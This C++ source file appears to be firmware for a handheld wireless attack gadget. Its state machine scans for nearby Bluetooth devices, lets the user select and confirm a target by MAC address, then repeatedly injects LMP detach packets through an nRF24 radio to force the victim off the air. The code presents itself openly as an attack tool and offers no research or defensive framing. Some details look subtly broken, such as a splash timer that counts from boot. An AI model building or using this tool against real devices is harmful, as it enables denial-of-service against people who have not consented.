#include "attack_manager.h"

AttackManager::AttackManager()
    : currentState(State::SPLASH),
      nextState(State::SPLASH),
      selectedDeviceIndex(0),
      scanStartTime(0),
      lastScanUpdateTime(0),
      attackStartTime(0),
      lastPacketSendTime(0),
      totalPacketsSent(0),
      attackProgress(0),
      attackRunning(false) {
    memset(targetMAC, 0, 6);
    memset(targetName, 0, sizeof(targetName));
    memset(errorMessage, 0, sizeof(errorMessage));
}

bool AttackManager::begin() {
    // Initialize display
    if (!display.begin()) {
        return false;
    }
    display.showSplash();
    
    // Initialize buttons
    if (!buttons.begin()) {
        return false;
    }
    
    // Initialize BT sniffer
    if (!btSniffer.begin()) {
        setError("BT init failed");
        return false;
    }
    
    // Initialize nRF24 injector
    if (!nrf24.begin()) {
        setError("nRF24 init failed");
        return false;
    }
    
    DEBUG_PRINTLN("AttackManager initialized successfully");
    return true;
}

void AttackManager::update() {
    // Update button states
    buttons.update();
    
    // Execute current state handler
    switch(currentState) {
        case State::SPLASH:
            handleSplash();
            break;
        case State::MENU:
            handleMenu();
            break;
        case State::SCANNING:
            handleScanning();
            break;
        case State::DEVICE_SELECT:
            handleDeviceSelect();
            break;
        case State::TARGET_CONFIRM:
            handleTargetConfirm();
            break;
        case State::ATTACKING:
            handleAttacking();
            break;
        case State::ERROR:
            handleError();
            break;
        case State::SUCCESS:
            handleSuccess();
            break;
        default:
            setState(State::MENU);
    }
    
    // Transition to next state if queued
    if (nextState != currentState) {
        currentState = nextState;
    }
}

void AttackManager::shutdown() {
    btSniffer.end();
    nrf24.end();
    display.powerOff();
}

// ============================================
// State Handlers
// ============================================

void AttackManager::handleSplash() {
    // Auto-transition after 3 seconds
    if (millis() > 3000) {
        setState(State::MENU);
    }
}

void AttackManager::handleMenu() {
    uint8_t btn1Event = buttons.getButton1Event();
    uint8_t btn2Event = buttons.getButton2Event();
    
    if (btn1Event == BUTTON_LONG_PRESS) {
        // Start scanning
        setState(State::SCANNING);
        btSniffer.startScan(BLE_SCAN_DURATION);
        scanStartTime = millis();
    }
    
    display.showMenu();
}

void AttackManager::handleScanning() {
    uint32_t elapsedMs = millis() - scanStartTime;
    uint32_t elapsedSec = elapsedMs / 1000;
    
    // Auto-stop scan after duration
    if (elapsedSec >= BLE_SCAN_DURATION) {
        btSniffer.stopScan();
        
        if (btSniffer.getDiscoveredCount() == 0) {
            setError("No devices found");
            setState(State::ERROR);
        } else {
            selectedDeviceIndex = 0;
            setState(State::DEVICE_SELECT);
        }
    }
    
    // Update display every 500ms
    if (millis() - lastScanUpdateTime >= 500) {
        display.showScanning(btSniffer.getDiscoveredCount(), elapsedSec);
        lastScanUpdateTime = millis();
    }
}

void AttackManager::handleDeviceSelect() {
    uint8_t btn1Event = buttons.getButton1Event();
    uint8_t btn2Event = buttons.getButton2Event();
    uint8_t deviceCount = btSniffer.getDiscoveredCount();
    
    if (deviceCount == 0) {
        setError("No devices");
        setState(State::ERROR);
        return;
    }
    
    // Button 1 short = Next device
    if (btn1Event == BUTTON_SHORT_PRESS) {
        selectedDeviceIndex = (selectedDeviceIndex + 1) % deviceCount;
    }
    
    // Button 2 = Previous device
    if (btn2Event == BUTTON_SHORT_PRESS) {
        selectedDeviceIndex = (selectedDeviceIndex == 0) ? (deviceCount - 1) : (selectedDeviceIndex - 1);
    }
    
    // Button 1 long = Select device
    if (btn1Event == BUTTON_LONG_PRESS) {
        BTDevice* device = btSniffer.getDevice(selectedDeviceIndex);
        if (device) {
            memcpy(targetMAC, device->mac, 6);
            strncpy(targetName, device->name, TARGET_NAME_MAX - 1);
            targetRSSI = device->rssi;
            setState(State::TARGET_CONFIRM);
        }
    }
    
    // Build device list for display
    const char* deviceNames[MAX_TARGETS];
    int8_t rssiValues[MAX_TARGETS];
    
    for (int i = 0; i < deviceCount; i++) {
        BTDevice* dev = btSniffer.getDevice(i);
        if (dev) {
            deviceNames[i] = dev->name;
            rssiValues[i] = dev->rssi;
        }
    }
    
    display.showDeviceList(deviceNames, deviceCount, selectedDeviceIndex, rssiValues);
}

void AttackManager::handleTargetConfirm() {
    uint8_t btn1Event = buttons.getButton1Event();
    uint8_t btn2Event = buttons.getButton2Event();
    
    // Button 2 = Back to device select
    if (btn2Event == BUTTON_SHORT_PRESS) {
        setState(State::DEVICE_SELECT);
        return;
    }
    
    // Button 1 long = Confirm and start attack
    if (btn1Event == BUTTON_LONG_PRESS) {
        attackStartTime = millis();
        totalPacketsSent = 0;
        attackRunning = true;
        setState(State::ATTACKING);
    }
    
    // Display target info
    char macStr[18];
    macToString(targetMAC, macStr, sizeof(macStr));
    display.showTargetConfirm(targetName, macStr, targetRSSI);
}

void AttackManager::handleAttacking() {
    uint8_t btn1Event = buttons.getButton1Event();
    uint8_t btn2Event = buttons.getButton2Event();
    
    // Button 2 = Stop attack
    if (btn2Event == BUTTON_SHORT_PRESS) {
        attackRunning = false;
        setState(State::SUCCESS);
        return;
    }
    
    // Send attack packets
    if (attackRunning && millis() - lastPacketSendTime >= ATTACK_CYCLE_INTERVAL) {
        nrf24.injectLMPDetach(targetMAC, ATTACK_PACKETS_PER_CYCLE);
        totalPacketsSent += ATTACK_PACKETS_PER_CYCLE;
        lastPacketSendTime = millis();
        
        DEBUG_PRINT("Packets sent: ");
        DEBUG_PRINTLN(totalPacketsSent);
    }
    
    // Calculate progress
    uint32_t elapsedMs = millis() - attackStartTime;
    attackProgress = (elapsedMs * 100) / ATTACK_TIMEOUT;
    if (attackProgress > 100) attackProgress = 100;
    
    // Auto-stop after timeout
    if (elapsedMs >= ATTACK_TIMEOUT) {
        attackRunning = false;
        setState(State::SUCCESS);
    }
    
    display.showAttacking(targetName, totalPacketsSent, attackProgress);
}

void AttackManager::handleError() {
    uint8_t btn1Event = buttons.getButton1Event();
    
    if (btn1Event == BUTTON_SHORT_PRESS || btn1Event == BUTTON_LONG_PRESS) {
        setState(State::MENU);
    }
    
    display.showError(errorMessage);
}

void AttackManager::handleSuccess() {
    // Auto-return to menu after 3 seconds
    if (millis() - attackStartTime > 3000) {
        setState(State::MENU);
    }
    
    display.showSuccess(targetName, totalPacketsSent);
}

// ============================================
// Helper Methods
// ============================================

void AttackManager::setState(State newState) {
    nextState = newState;
    DEBUG_PRINT("State transition to: ");
    DEBUG_PRINTLN((int)newState);
}

void AttackManager::setError(const char* msg) {
    if (msg) {
        strncpy(errorMessage, msg, sizeof(errorMessage) - 1);
        errorMessage[sizeof(errorMessage) - 1] = '\0';
    }
    setState(State::ERROR);
    DEBUG_PRINT("ERROR: ");
    DEBUG_PRINTLN(errorMessage);
}
